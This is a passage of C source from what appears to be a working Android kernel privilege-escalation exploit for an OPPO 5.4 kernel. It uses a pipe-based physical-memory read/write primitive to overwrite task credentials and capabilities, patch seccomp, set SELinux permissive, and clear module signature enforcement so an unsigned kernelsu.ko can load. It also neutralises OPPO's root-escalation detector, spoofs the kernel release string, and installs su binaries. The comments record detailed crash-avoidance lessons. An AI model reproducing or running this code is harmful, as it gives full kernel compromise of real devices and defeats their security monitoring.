    /* Walked enough of the list and every tgid-matched thread we found has
     * pi_blocked_on already 0 (ETIMEDOUT cleans it in-kernel).  TASK_COMM_OFF
     * is unvalidated on this target so waiter_seen may stay 0 even when the
     * waiter task was walked — do not require it. */
    if (best_walked >= 256 && tgid_matches > 0 && cleared == 0 && failures == 0) {
      pr_info("pi_cleanup: no dangling pi_blocked_on on %d tgid threads "
              "(walked=%d); treating as clean\n",
              tgid_matches, best_walked);
      break;
    }
  }
  pr_info("pi_cleanup summary tid=%d waiter_seen=%d tgid_matches=%d "
          "cleared=%d fail=%d walked=%d\n",
          tid, waiter_seen, tgid_matches, cleared, failures, best_walked);
  if (failures) return 0;
scrub:
  /* Zero the fake rt_mutex .bss slot: rb_erase left waiters.rb_node /
   * rb_leftmost pointing into this thread's kernel stack; exiting without
   * scrub lets the next walker of that (seemingly live) rb tree oops. */
  if (!pselect_scrub_slot(fd)) {
    pr_warning("pi_cleanup: slot scrub failed; holding to avoid panic\n");
    return 0;
  }
  /* Also clear forged pipe_buffer.ops on the reclaim slab: on process exit
   * free_pipe_info() put_page()s every buffer with non-NULL ops, and forged
   * pages are kernel pages — wrong refcount -> oops -> panic. */
  if (!pipe_clear_forged_ops(fd)) {
    pr_warning("pi_cleanup: pipe ops clear failed; holding to avoid panic\n");
    return 0;
  }
  return 1;
}

static int fake_gki_env_enabled(void) {
  const char *v = getenv("KS_FAKE_GKI");
  if (!v || !v[0]) {
    return 0;
  }
  if (strcmp(v, "0") == 0 || strcasecmp(v, "false") == 0 ||
      strcasecmp(v, "no") == 0) {
    return 0;
  }
  return 1;
}

static int find_bytes_offset(const char *hay, size_t hay_len,
                             const char *needle, size_t needle_len) {
  if (needle_len == 0 || hay_len < needle_len) {
    return -1;
  }
  for (size_t i = 0; i + needle_len <= hay_len; i++) {
    if (memcmp(hay + i, needle, needle_len) == 0) {
      return (int)i;
    }
  }
  return -1;
}

/* Flip the uname release so managers doing isGKI() checks (major>5 ||
 * 5.10+) pass on this 5.4 kernel: rewrite only the leading "5.4." of
 * init_uts_ns.name.release to "6.1." in place (identical length). */
static int fake_gki_release(int fd) {
  if (!fake_gki_env_enabled()) {
    return 0;
  }
  struct utsname uts;
  if (uname(&uts) != 0) {
    pr_warning("fake gki uname failed errno=%d\n", errno);
    return 0;
  }
  if (strncmp(uts.release, "5.4.", 4) != 0) {
    pr_info("fake gki skip non-5.4 release=%s\n", uts.release);
    return 0;
  }
  uintptr_t base = data_addr(INIT_UTS_NS);
  char buf[512];
  memset(buf, 0, sizeof(buf));
  if (!pipe_phys_read_data(fd, base, buf, sizeof(buf))) {
    pr_warning("fake gki read failed addr=%016llx\n",
               (unsigned long long)base);
    return 0;
  }
  size_t rlen = strlen(uts.release);
  if (rlen < 4 || rlen > 64) {
    pr_warning("fake gki bad release len=%zu\n", rlen);
    return 0;
  }
  int off = find_bytes_offset(buf, sizeof(buf), uts.release, rlen);
  if (off < 0 || off > 300) {
    pr_warning("fake gki release not found in init_uts_ns\n");
    return 0;
  }
  if (find_bytes_offset(buf, (size_t)off, "Linux", 5) < 0) {
    pr_warning("fake gki sysname context missing off=%d\n", off);
    return 0;
  }
  char patched[72];
  memcpy(patched, "6.1.", 4);
  memcpy(patched + 4, uts.release + 4, rlen - 4);
  patched[rlen - 4 + 4] = 0;
  if (!pipe_phys_write_data(fd, base + (uintptr_t)off, patched, rlen + 1)) {
    pr_warning("fake gki write failed off=%d\n", off);
    return 0;
  }
  char verify[72];
  memset(verify, 0, sizeof(verify));
  if (!pipe_phys_read_data(fd, base + (uintptr_t)off, verify,
                           rlen + 1)) {
    pr_warning("fake gki verify read failed\n");
    return 0;
  }
  int ok = memcmp(verify, patched, rlen + 1) == 0;
  pr_success("fake gki release old=%s new=%s ok=%d\n", uts.release, verify,
              ok);
  return ok;
}

/*
 * Clear kernel module signature enforcement (bool `sig_enforce` in .data).
 * CONFIG_MODULE_SIG_FORCE defaults it on, and its sysfs knob uses
 * bool_enable_only (can be enabled but never disabled from userspace), so
 * unsigned modules are rejected (-EKEYREJECTED) unless the variable is
 * written directly through the pipe primitive. Required for loading our
 * unsigned kernelsu.ko via finit_module (post-lock recovery path).
 *
 * Address comes from the target.h data-symbol table (data_addr), NOT
 * /proc/kallsyms: kptr_restrict=2 zeroes addresses even for root.
 * Safety: only write when the byte reads exactly 1 (SIG_FORCE initial
 * value); any other value means a wrong address, so refuse.
 */
static int patch_sig_enforce(int fd) {
  uintptr_t addr = data_addr(SIG_ENFORCE);
  if (!is_direct_ptr(addr)) {
    pr_warning("sig_enforce: addr %016llx not a direct ptr\n",
               (unsigned long long)addr);
    return 0;
  }
  uint64_t word = pipe_read64(fd, addr);
  uint8_t before = (uint8_t)word;
  if (before == 0) {
    pr_info("sig_enforce %016llx already 0\n", (unsigned long long)addr);
    return 1;
  }
  if (before != 1) {
    pr_warning("sig_enforce %016llx unexpected byte %u, refusing write\n",
               (unsigned long long)addr, before);
    return 0;
  }
  uint64_t want = word & ~0xffULL; /* bool occupies byte0; keep bytes1-7 */
  int ok = pipe_write64(fd, addr, want);
  uint64_t after = pipe_read64(fd, addr);
  pr_info("sig_enforce %016llx %u->%u write=%d\n",
          (unsigned long long)addr, before, (uint8_t)after, ok);
  return ok && (uint8_t)after == 0;
}

/* Local file writer (util.c's ks_write_file is static to that unit). */
static int root_write_file(const char *path, const char *data) {
  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0666);
  if (fd < 0)
    return -errno;
  size_t n = strlen(data);
  ssize_t w = write(fd, data, n);
  close(fd);
  return w == (ssize_t)n ? 0 : -EIO;
}

/* Single-symbol /proc/kallsyms lookup. Returns 0 when absent or hidden
 * (kptr_restrict hides values for this uid). */
static uintptr_t ks_lookup_kallsym(const char *want) {
  FILE *f = fopen("/proc/kallsyms", "r");
  if (!f)
    return 0;
  char line[384], name[256];
  unsigned long long a;
  char type;
  uintptr_t found = 0;
  while (fgets(line, sizeof(line), f)) {
    if (sscanf(line, "%llx %c %255s", &a, &type, name) != 3)
      continue;
    if (strcmp(name, want) == 0) {
      found = (uintptr_t)a;
      break;
    }
  }
  fclose(f);
  return found;
}

/*
 * Disable OPPO's per-syscall escalation detector -- the red-card root
 * cause. oplus_root_check_succ runs on syscall exit, checks
 * old_euid -> curr_uid flips, prints the kevent payload plus
 * "[OPLUS_ROOT_CHECK]:Kill the process of escalation..." and the process
 * dies (app self-check's libksud -> SIGKILL -> libsu "not a shell" ->
 * both red cards; executed in-kernel and via vendor.qti perf HAL tgkill).
 * Our chain's own cred flip never reaches this detector (memory-direct,
 * kprobe-verified: all 16 hits were libksud.so), so only the app's
 * legitimate ksud trips it.
 *
 * Patch = overwrite the first two aarch64 instructions:
 *   mov w0, #0   (0x52800000)  detector returns "clean"
 *   ret          (0xd65f03c0)
 * written little-endian as 0xd65f03c052800000.
 *
 * Address: the uid2000 attempt in ks_layout_init fails (kptr_restrict
 * is 0644 root:root), so rewrite it here as uid0 and re-read kallsyms.
 * Sanity: address must sit in kernel text around kaslr_base.
 */
static int patch_oplus_root_check(int fd) {
  int wr = root_write_file("/proc/sys/kernel/kptr_restrict", "0");
  /* The pipe rw primitive is physmap-only: pipe_phys_write_data gates on
   * is_direct_ptr() and the DIRECT_MAP window [0xffffff80.., 0xffffff90..)
   * does NOT contain the KIMAGE exec mapping (0xffffffc0.. slid to
   * 0xffffffdd.. on this boot -- round 44 skipped here).  Keep both
   * forms: kaddr (KIMAGE, slid) for sanity + logs, paddr (physmap alias,
   * slide-INDEPENDENT -- direct map keys off physical address) for the
   * actual read/write.  data_addr() is the same converter patch_sig_enforce
   * uses; both land in the same physical .data/.text pages. */
  uintptr_t off = 0;
  uintptr_t kaddr = 0; /* KIMAGE exec-mapping (slid) */
  uintptr_t paddr = 0; /* physmap alias for pipe rw */
  uintptr_t img = ks_lookup_kallsym("oplus_root_check_succ");
  if (img) {
    off = kaslr_done ? (img - kaslr_base) : (img - KIMAGE_TEXT_BASE);
    kaddr = kaslr_image_addr(KIMAGE_TEXT_BASE + off);
    paddr = data_addr(KIMAGE_TEXT_BASE + off);
  } else {
    /* Fallback: host-harvested slide-independent offset. Rewriting
     * kptr_restrict fails from our domain (proc_security SELinux deny,
     * EACCES -13, dontaudit-silenced), so post_root.sh registers an
     * ip=$ip ocs kprobe, lets the app self-check's libksud hit it once,
     * and persists "ip=<abs> text=<kaslr_base>" here. off=ip-text is
     * slide-independent; kaddr = THIS boot's kaslr_base + off (same
     * kernel image). All arithmetic stays in 64-bit C: toybox sh
     * truncates 0x7393ea5000-class values to 32 bits. */
    FILE *f = fopen("/data/local/tmp/ocs_sym_off", "r");
    if (f) {
      char line[160];
      if (fgets(line, sizeof(line), f)) {
        unsigned long long hip = 0, htext = 0;
        if (sscanf(line, "ip=%llx text=%llx", &hip, &htext) == 2 &&
            hip > htext && (hip - htext) < 0x04000000ULL) {
          off = (uintptr_t)(hip - htext);
          kaddr = kaslr_base + off;
          paddr = data_addr(KIMAGE_TEXT_BASE + off);
          pr_info("oplus_root_check: harvest off=%llx (ip=%016llx "
                  "text=%016llx) -> kaddr=%016llx paddr=%016llx\n",
                  (unsigned long long)off, hip, htext,
                  (unsigned long long)kaddr, (unsigned long long)paddr);
        } else {
          pr_warning("oplus_root_check: bad harvest line '%.80s'\n", line);
        }
      }
      fclose(f);
    }
  }
  /* Rounds 44/45/46 settled .text access, both doors panic:
   *  - r44: pipe_* is_direct_ptr gate rejected KIMAGE addr (safe skip);
   *  - r45: pipe_* fed the physmap alias -> phys-probe WRITE died on the
   *    .text page (linear map RO after mark_rodata_ro) -> oops -> panic;
   *  - r46: configfs_read_once on the KIMAGE exec addr (RX) -> panic at
   *    first access; .data targets (fops @0x2b51d38, sig_enforce
   *    @0x2b89d20) are the ONLY proven-writable class -- the configfs
   *    primitive carries a write step, .text/.rodata are a dead zone.
   * Reverse-engineering the function (bootdump, 0x26a620): no .data
   * enable/whitelist gate exists; allocation-failure returns 0, kill
   * lives in the kevent chain downstream.  So: NEVER touch the target
   * from here.  Log diagnostics only and defer to the ocsk.ko route
   * (register_kprobe pre_handler: regs->x0=0, return 1 -- kernel pokes
   * .text itself, tracefs kprobe on this symbol already proven in r41). */
  pr_info("oplus_root_check: kptr_restrict write=%d kaddr=%016llx "
          "paddr=%016llx (deferred: .text via ocsk.ko)\n",
          wr, (unsigned long long)kaddr, (unsigned long long)paddr);
  (void)paddr;
  if (!kaddr) {
    pr_warning("oplus_root_check: no address (harvest/kallsyms), skip\n");
    return 0;
  }
  if (kaslr_done && (kaddr < kaslr_base || kaddr >= kaslr_base + 0x04000000ULL)) {
    pr_warning("oplus_root_check: kaddr %016llx outside text base %016llx, "
               "refusing\n",
               (unsigned long long)kaddr, (unsigned long long)kaslr_base);
    return 0;
  }
  pr_info("oplus_root_check %016llx entry-instruction probe deferred "
          "(ocsk.ko will register kprobe on kallsyms name)\n",
          (unsigned long long)kaddr);
  return 0;
  /* dead code below kept for reference if a future kernel maps .text RW
   * through a primitive that is write-free on reads */
  uint64_t word = 0;
  ssize_t rd = configfs_read_once(fd, kaddr, &word, sizeof(word));
  const uint64_t patched = 0xd65f03c052800000ULL;
  if (word == patched) {
    pr_info("oplus_root_check %016llx already patched\n",
            (unsigned long long)kaddr);
    root_write_file("/data/local/tmp/.oplus_patched", "already\n");
    return 1;
  }
  /* aarch64 function-entry shapes seen on this kernel family: stp
   * x29,x30 (a9..7bfd), sub sp (d1....), mov x29,sp, paciasp, bti c,
   * nop, str x30,[sp,#-16]! (clang -O2 leaf, same as ReSukiSU's so).
   * Unknown entries are refused WITH the word printed, so the table can
   * grow from log evidence instead of guessing. */
  uint32_t ins0 = (uint32_t)word;
  uint32_t ins1 = (uint32_t)(word >> 32);
  int looks_entry = (ins0 & 0xffc003ff) == 0xa98003ff || /* stp x29,x30,[sp,#-N]! */
                    (ins0 & 0xffc003ff) == 0xa90003ff || /* stp x29,x30,[sp,#N] */
                    (ins0 & 0xffc003e0) == 0xd1000000 || /* sub sp,sp,#imm */
                    ins0 == 0xaa537bfd ||                /* mov x29,sp */
                    ins0 == 0xd503237f ||                /* paciasp */
                    ins0 == 0xd503245f ||                /* bti c */
                    ins0 == 0xd503201f ||                /* nop */
                    ins0 == 0xf81f0ffe ||                /* str x30,[sp,#-16]! */
                    ins0 == 0xa9bf7bfd ||                /* stp x29,x30,[sp,#-16]! */
                    ins0 == 0xa9b87bfd ||                /* stp x29,x30,[sp,#-0x40]! */
                    (ins0 & 0xffe003ff) == 0xf800025e;   /* str x30,[x18,#imm]!:
                                                          * SCS push first insn of
                                                          * oplus_root_check_succ
                                                          * on this kernel
                                                          * (measured f800865e,
                                                          * CONFIG_SHADOW_CALL_STACK;
                                                          * imm9+op2 masked off) */
  if (!looks_entry) {
    pr_warning("oplus_root_check %016llx (paddr %016llx) unexpected entry "
               "insn %08x %08x rd=%zd, refusing write\n",
               (unsigned long long)kaddr, (unsigned long long)paddr,
               ins0, ins1, rd);
    return 0;
  }
  ssize_t wrn = configfs_write_once(fd, kaddr, &patched, sizeof(patched));
  uint64_t after = 0;
  configfs_read_once(fd, kaddr, &after, sizeof(after));
  pr_info("oplus_root_check %016llx (paddr %016llx) %08x%08x->%08x%08x "
          "write=%zd/%d\n",
          (unsigned long long)kaddr, (unsigned long long)paddr, ins0, ins1,
          (uint32_t)after, (uint32_t)(after >> 32), wrn,
          (int)(wrn == (ssize_t)sizeof(patched)));
  if (wrn == (ssize_t)sizeof(patched) && after == patched) {
    root_write_file("/data/local/tmp/.oplus_patched", "ok\n");
    return 1;
  }
  return 0;
}

int install_android_root(int fd) {
  /* round5 fail-fast: once the write stage below has touched kernel memory
   * (seccomp/cred/caps/selinux), a second pass over the half-patched state
   * corrupts shared structures (init release_task Oops -> panic).  The
   * in-function self-patch path is unaffected -- this only blocks a fresh
   * re-entry after a previous call already wrote and failed. */
  if (atomic_load(&root_stage_dirty)) {
    pr_warning("root stage dirty (kernel already patched); refusing re-entry\n");
    return 0;
  }
  root_uid_before = getuid();
  /* v21: patch the OPPO escalation detector at the EARLIEST possible
   * point.  The physrw fd is already live here (route stage proved it
   * with its cfgfs read/write loop).  Rounds 29 and 43 both died to ocs
   * MID-cred-write on the self-direct flip path -- sig_enforce (the old
   * call site, below) comes too late to help when the kill fires during
   * spawn/cred itself.  Repeat calls are harmless: the function short-
   * circuits on an already-patched read-back. */
  patch_oplus_root_check(fd);
  /* uid2000 safe period: burn binder cold-start for the self-patch fire. */
  fire_persist_prep();
  if (!spawn_root_child()) {
    pr_info("root spawn failed child=%d\n", root_child_pid);
    return 0;
  }

  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
  pipe_phys_read_data(fd, selinux_addr, &selinux_before, sizeof(selinux_before));
  if (opt_disabled_selinux) {
    uint8_t permissive = 0;
    int early_selinux_ok =
      pipe_phys_write_data(fd, selinux_addr, &permissive, sizeof(permissive));
    uint8_t early_selinux_after = 0xff;
    pipe_phys_read_data(fd, selinux_addr, &early_selinux_after,
                        sizeof(early_selinux_after));
    pr_info("root selinux early write ok=%d %u->%u\n", early_selinux_ok,
            selinux_before, early_selinux_after);
  }
  selinux_cred_blob_off =
    pipe_read32(fd, data_addr(SELINUX_BLOB_SIZES));
  target_cred_osid = SELINUX_KERNEL_SID;
  target_cred_sid = SELINUX_KERNEL_SID;

  init_tasks_prev = pipe_read64(fd, data_addr(INIT_TASK_TASKS) + 8);
  if (!is_direct_ptr(current_task_addr)) {
    current_task_addr = 0;
  }

  if (!is_direct_ptr(init_tasks_prev)) {
    pr_info("root bad init_tasks_prev=%016llx\n",
            (unsigned long long)init_tasks_prev);
    return 0;
  }
  current_task_addr = init_tasks_prev - TASK_TASKS_OFF;
  last_task_guess = current_task_addr;

  found_task_pid = pipe_read32(fd, current_task_addr + TASK_PID_OFF);
  found_task_tgid = pipe_read32(fd, current_task_addr + TASK_TGID_OFF);
  memset(found_task_comm, 0, sizeof(found_task_comm));
  pipe_phys_read_data(
      fd, current_task_addr + TASK_COMM_OFF, found_task_comm, TASK_COMM_LEN);
  if (found_task_tgid != (uint32_t)root_child_pid) {
    current_task_addr = find_task_by_tgid(fd, (uint32_t)root_child_pid);
    if (!is_direct_ptr(current_task_addr)) {
      pr_info("root task walk failed want=%u iters=%d last=%016llx pid=%u tgid=%u\n",
              (uint32_t)root_child_pid, task_walk_iters,
              (unsigned long long)task_walk_last_entry, task_walk_last_pid,
              task_walk_last_tgid);
      return 0;
    }
  }

  /*
   * While the root child is alive (it exits in collect_root_child below),
   * recover OUR task through its real_parent/parent pointer.  The pointer
   * lives somewhere between tgid and cred in task_struct; every candidate
   * is validated by reading back tgid==getpid() plus the "ks_waiter" comm
   * from the pointed-to task.  This gives the self patch a zero-walk task
   * address -- find_task_by_tgid loses the chain on one bad next read and
   * panics (run18/21/22/23).
   */
  self_task_addr = 0;
  for (uint32_t slot = TASK_TGID_OFF + 4; slot + 8 <= TASK_CRED_OFF;
       slot += 8) {
    uint64_t cand = pipe_read64(fd, current_task_addr + slot);
    if (!is_direct_ptr(cand)) {
      continue;
    }
    if (pipe_read32(fd, cand + TASK_TGID_OFF) != (uint32_t)getpid()) {
      continue;
    }
    char comm[TASK_COMM_LEN + 1];
    memset(comm, 0, sizeof(comm));
    pipe_phys_read_data(fd, cand + TASK_COMM_OFF, comm, TASK_COMM_LEN);
    if (strncmp(comm, "ks_waiter", TASK_COMM_LEN) != 0) {
      continue;
    }
    self_task_addr = cand;
    pr_info("self task via child slot+%#x = %016llx (real_parent, comm ok)\n",
            slot, (unsigned long long)cand);
    break;
  }
  if (!self_task_addr) {
    pr_warning("self task parent scan found nothing; self patch will fall "
               "back to the (hardened) walk\n");
  }

  uintptr_t real_cred_slot = current_task_addr + TASK_REAL_CRED_OFF;
  current_real_cred_addr = pipe_read64(fd, real_cred_slot);
  current_cred_addr = pipe_read64(fd, current_task_addr + TASK_CRED_OFF);
  uintptr_t cred_security_slot = current_cred_addr + CRED_SECURITY_OFF;
  uintptr_t real_security_slot = current_real_cred_addr + CRED_SECURITY_OFF;
  current_cred_security_addr = pipe_read64(fd, cred_security_slot);
  current_real_cred_security_addr = pipe_read64(fd, real_security_slot);
  uintptr_t sid_off = selinux_cred_blob_off + SELINUX_CRED_SID_OFF;
  if (is_direct_ptr(current_cred_security_addr)) {
    uintptr_t sid_addr = current_cred_security_addr + sid_off;
    cred_sid_before = pipe_read32(fd, sid_addr);
  }
  if (is_direct_ptr(current_real_cred_security_addr)) {
    uintptr_t sid_addr = current_real_cred_security_addr + sid_off;
    real_cred_sid_before = pipe_read32(fd, sid_addr);
  }
  uint64_t cred_caps_before[CRED_CAP_WORDS] = {0};
  uint64_t real_caps_before[CRED_CAP_WORDS] = {0};
  pipe_phys_read_data(
      fd, current_cred_addr + CRED_CAPS_OFF, cred_caps_before,
      sizeof(cred_caps_before));
  pipe_phys_read_data(
      fd, current_real_cred_addr + CRED_CAPS_OFF, real_caps_before,
      sizeof(real_caps_before));
  /* Last safe point: everything below writes kernel memory.  Once written,
   * this process must never re-enter the root stage (root_stage_dirty). */
  atomic_store(&root_stage_dirty, 1);
  if (!patch_task_seccomp(fd, current_task_addr)) {
    pr_info("root patch seccomp failed task=%016llx\n",
            (unsigned long long)current_task_addr);
    return 0;
  }
  /* Safe period first: caps/sid for both creds while the child task is
   * still uid2000 — the flips below open its kill window, so nothing else
   * may follow them but the window's own work. */
  if (!patch_cred_object_prepare(fd, current_cred_addr)) {
    pr_info("root patch cred failed cred=%016llx\n",
            (unsigned long long)current_cred_addr);
    return 0;
  }
  if (current_real_cred_addr != current_cred_addr &&
      !patch_cred_object_prepare(fd, current_real_cred_addr)) {
    pr_info("root patch real_cred failed real=%016llx\n",
            (unsigned long long)current_real_cred_addr);
    return 0;
  }

  if (!patch_cred_object_flip(fd, current_cred_addr)) {
    pr_info("root flip cred failed cred=%016llx\n",
            (unsigned long long)current_cred_addr);
    return 0;
  }
  if (current_real_cred_addr != current_cred_addr &&
      !patch_cred_object_flip(fd, current_real_cred_addr)) {
    pr_info("root flip real_cred failed real=%016llx\n",
            (unsigned long long)current_real_cred_addr);
    return 0;
  }

  uint32_t cred_uid_after = pipe_read32(fd, current_cred_addr + CRED_UID_OFF);
  uint32_t real_uid_after =
    pipe_read32(fd, current_real_cred_addr + CRED_UID_OFF);
  uint64_t cred_caps_after[CRED_CAP_WORDS] = {0};
  uint64_t real_caps_after[CRED_CAP_WORDS] = {0};
  pipe_phys_read_data(
      fd, current_cred_addr + CRED_CAPS_OFF, cred_caps_after,
      sizeof(cred_caps_after));
  pipe_phys_read_data(
      fd, current_real_cred_addr + CRED_CAPS_OFF, real_caps_after,
      sizeof(real_caps_after));
  if (is_direct_ptr(current_cred_security_addr)) {
    uintptr_t sid_addr = current_cred_security_addr + sid_off;
    cred_sid_after = pipe_read32(fd, sid_addr);
  }
  if (is_direct_ptr(current_real_cred_security_addr)) {
    uintptr_t sid_addr = current_real_cred_security_addr + sid_off;
    real_cred_sid_after = pipe_read32(fd, sid_addr);
  }
  pr_info("root cred patched uid=%u/%u sid=%u/%u\n", cred_uid_after,
          real_uid_after, cred_sid_after, real_cred_sid_after);
  pr_info("root caps patched cred eff=%016llx/%016llx prm=%016llx/%016llx "
          "amb=%016llx/%016llx bset=%016llx/%016llx real_eff=%016llx/%016llx\n",
          (unsigned long long)cred_caps_before[CRED_CAP_EFFECTIVE],
          (unsigned long long)cred_caps_after[CRED_CAP_EFFECTIVE],
          (unsigned long long)cred_caps_before[CRED_CAP_PERMITTED],
          (unsigned long long)cred_caps_after[CRED_CAP_PERMITTED],
          (unsigned long long)cred_caps_before[CRED_CAP_AMBIENT],
          (unsigned long long)cred_caps_after[CRED_CAP_AMBIENT],
          (unsigned long long)cred_caps_before[CRED_CAP_BSET],
          (unsigned long long)cred_caps_after[CRED_CAP_BSET],
          (unsigned long long)real_caps_before[CRED_CAP_EFFECTIVE],
          (unsigned long long)real_caps_after[CRED_CAP_EFFECTIVE]);

  uint8_t permissive = 0;
  int selinux_direct_ok = 1;
  if (opt_disabled_selinux) {
    selinux_direct_ok =
      pipe_phys_write_data(fd, selinux_addr, &permissive, sizeof(permissive));
  }
  uint8_t selinux_mid = 0xff;
  pipe_phys_read_data(fd, selinux_addr, &selinux_mid, sizeof(selinux_mid));
  pr_info("root selinux direct write ok=%d %u->%u\n", selinux_direct_ok,
          selinux_before, selinux_mid);

  capable_head_before = pipe_read64(fd, data_addr(SECURITY_CAPABLE_HEAD));
  root_child_done = collect_root_child();
  struct root_report report;
  memset(&report, 0, sizeof(report));
  if (root_shared) {
    report = root_shared->report;
  }
  capable_head_after = pipe_read64(fd, data_addr(SECURITY_CAPABLE_HEAD));
  pipe_phys_read_data(fd, selinux_addr, &selinux_after, sizeof(selinux_after));
  int installer_gate = root_shared ? atomic_load(&root_shared->installer_gate) : 0;
  int installer_pid = root_shared ? atomic_load(&root_shared->installer_pid) : 0;
  int installer_errno = root_shared ? atomic_load(&root_shared->installer_errno) : 0;
  int installer_started = root_shared ? atomic_load(&root_shared->installer_started) : 0;
  int installer_done = root_shared ? atomic_load(&root_shared->installer_done) : 0;
  int installer_ok = root_shared ? atomic_load(&root_shared->installer_ok) : 0;
  int installer_uid = root_shared ? atomic_load(&root_shared->installer_uid) : -1;
  int installer_euid = root_shared ? atomic_load(&root_shared->installer_euid) : -1;
  pr_info("root child result done=%d uid_after=%u setgid=%d/%d setuid=%d/%d "
          "setenforce=%d/%d selinux=%u->%u "
          "installer=%d pid=%d err=%d started=%d done=%d ok=%d uid=%d euid=%d "
          "cap=%016llx/%016llx\n",
          root_child_done, root_uid_after, report.setgid_ret,
          report.setgid_errno, report.setuid_ret, report.setuid_errno,
          setenforce_ret, setenforce_errno,
          selinux_before, selinux_after,
          installer_gate, installer_pid, installer_errno, installer_started,
          installer_done, installer_ok, installer_uid, installer_euid,
          (unsigned long long)capable_head_before,
          (unsigned long long)capable_head_after);
  /*
   * Clear the route-installed PI chain HERE, before the self-patch /
   * sig_enforce stages issue their thousands of pipe ops.  Each pipe op
   * re-enters the kernel and a scheduling event may walk the stale
   * rt_mutex chain (waiter->pi_blocked_on -> slot/stack garbage) --
   * run18/run21 both died deep inside the 826 task walk with done=0 and
   * pi_cleanup still gated behind it at the stage tail.
   */
  int pi_ok = ks_pi_cleanup(fd);
  pr_info("root self pi_cleanup ok=%d waiter_tid=%d done=%d (pre-self)\n",
          pi_ok, atomic_load(&waiter_tid), root_child_done);
  if (pi_ok) {
    atomic_store(&pi_cleanup_done, 1);
  } else {
    pr_warning("root self pi_cleanup failed early; holding forever to avoid panic\n");
    fake_gki_release(fd);
    for (;;) {
      pause();
    }
  }
  /* The root child beating us to done=1 means root=1 is already locked —
   * flip OUR cred only when the child path failed, because our flip opens
   * OUR kill window and ends the run mid-chain. */
  if (opt_patch_self && !root_child_done) {
    /* PANIC-PATH KILL SWITCH (marathon3 r5 boot b04eec8b + marathon4 r4
     * boot cf4d5f87, identical signature): first-pass writes all landed
     * (seccomp/cred/caps/selinux), root child SIGKILLed (wst=9, likely
     * OPLUS_ROOT_CHECK firing on its setuid when the entry-point ocs patch
     * missed), then this branch re-ran seccomp+task-prepare+flip over the
     * half-patched state; both rounds stalled ~90s mid-sequence (no
     * "root self syscall setgid" line ever printed) and panicked the box
     * via init release_task Oops -> Fatal exception.  Every PASS round in
     * both marathons had root_child_done=1 and never entered here; the
     * self flip has zero recorded successes.  Neutralize (safe landmine
     * clearing) then fail fast; the fail amplifier reboots into a fresh
     * boot where the ocs patch re-rolls and the root child may survive. */
    pr_warning("root child dead after first-pass writes; self-patch flip "
               "disabled (panic path); neutralize + fail fast for reboot\n");
    fops_guard_set_expect(0);
    ks_neutralize_fake_fops_close(fd);
    goto self_patch_skip;
    /* v4 pre-flip defuse: the uid0 monitor SIGKILL may end this process on
     * any instruction after our own cred flip (v3 4619b3e7: flip ->
     * SIGKILL(137) -> exit tail never ran -> do_exit tore down a still-dirty
     * fd/pipe table -> kernel panic).  Zero the fake table's close-path
     * slots and the forged pipe_buffer.ops NOW: after this point the
     * process may die at any microsecond, so every landmine do_exit could
     * hit must already be defused; the exit tail's own cleanup is then a
     * no-op re-run if we survive. */
    /* v5 04f1fef0 round: neutralize+pipe_clear alone still panicked ~13s
     * after the monitor SIGKILL (bootreason=kernel_panic,fatal_exception,
     * no second contract line = killed between prepare and the flip
     * write).  The exit tail that IS proven safe is a TRIPLE:
     * disarm guard -> neutralize -> close probe fd.  Mirror all three
     * here: disarm stops the guard re-arming misc.fops through the fd we
     * are about to drop (a racing in-flight guard access EBADFs benignly,
     * reads only count), and dropping g_fops_probe_fd removes the last
     * fake-fops filp_close do_exit could take. */
    fops_guard_set_expect(0);
    ks_neutralize_fake_fops_close(fd);
    if (g_fops_probe_fd >= 0) {
      int pfd = g_fops_probe_fd;
      g_fops_probe_fd = -1;
      close(pfd);
      pr_info("root self pre-flip closed fake-fops probe fd=%d\n", pfd);
    }
    if (!pipe_clear_forged_ops(fd)) {
      pr_warning("root self pre-flip pipe ops clear failed\n");
    }
    int self_ok = 0;
    uintptr_t sc = 0, sr = 0;
    if (is_direct_ptr(self_task_addr) &&
        pipe_read32(fd, self_task_addr + TASK_TGID_OFF) ==
            (uint32_t)getpid()) {
      self_ok = patch_task_root_prepare(fd, self_task_addr, "self-direct", &sc,
                                        &sr);
      if (self_ok) {
        self_ok = patch_task_root_flip(fd, "self-direct", sc, sr);
      }
    } else {
      self_ok = patch_task_root_by_tgid(fd, (uint32_t)getpid(), "self");
    }
    int self_setgid_ret = -1;
    int self_setuid_ret = -1;
    if (self_ok) {
      errno = 0;
      self_setgid_ret = setgid(0);
      int self_setgid_errno = errno;
      errno = 0;
      self_setuid_ret = setuid(0);
      int self_setuid_errno = errno;
      if (getuid() == 0 && geteuid() == 0) {
        atomic_store(&self_root_ok, 1);
        /* Contract line FIRST — SIGKILL lands any microsecond now, and
         * run_fops/auto_retry grep the log, not our exit status. */
        pr_info("pipe-physrw-summary pid=%d done=1 root=1 kaslr=1\n",
                getpid());
        pr_info("self root ok; root=1 contract satisfied via self patch\n");
        ks_lock_contract_state();
        ks_persist_kaslr_file();
        fire_persist_once();
      }
      pr_info("root self syscall setgid=%d/%d setuid=%d/%d uid=%u euid=%u gid=%u egid=%u\n",
              self_setgid_ret, self_setgid_errno, self_setuid_ret,
              self_setuid_errno, getuid(), geteuid(), getgid(), getegid());
      if (getuid() == 0 && geteuid() == 0 &&
          getenv("KSUD_NO_PARENT_INSTALL") == NULL) {
        int ksud_ok = install_embedded_ksud();
        pr_info("root self ksud install ok=%d errno=%d uid=%u euid=%u\n",
                ksud_ok, errno, getuid(), geteuid());
      }
      if (getuid() == 0 && geteuid() == 0) {
        pid_t su_pid = -1;
        int su_ok = install_embedded_su(&su_pid);
        pr_info("root self su install ok=%d pid=%d errno=%d uid=%u euid=%u\n",
                su_ok, (int)su_pid, errno, getuid(), geteuid());
      }
    }
  }

  int sig_ok = patch_sig_enforce(fd);

  /* Must land before ks_insmod's finitmod retry flips to success and
   * post_root.sh launches (0.2s granularity; post_root's own pre-am-start
   * steps take seconds), so am start sees the detector already dead. */
  int ocs_ok = patch_oplus_root_check(fd);
  pr_info("root ocs detector patch ok=%d\n", ocs_ok);

  if (sig_ok && getuid() == 0) {
    const char *finitmod = getenv("KS_FINITMOD");
    if (!finitmod || !finitmod[0]) finitmod = "/data/local/tmp/home/finitmod";
    const char *ko = getenv("KS_KO");
    if (!ko || !ko[0]) ko = "/data/local/tmp/home/kernelsu.ko";
    int fm_ok = 0;
    if (access(finitmod, X_OK) == 0 && access(ko, R_OK) == 0) {
      pr_info("root self finitmod fork %s %s 0\n", finitmod, ko);
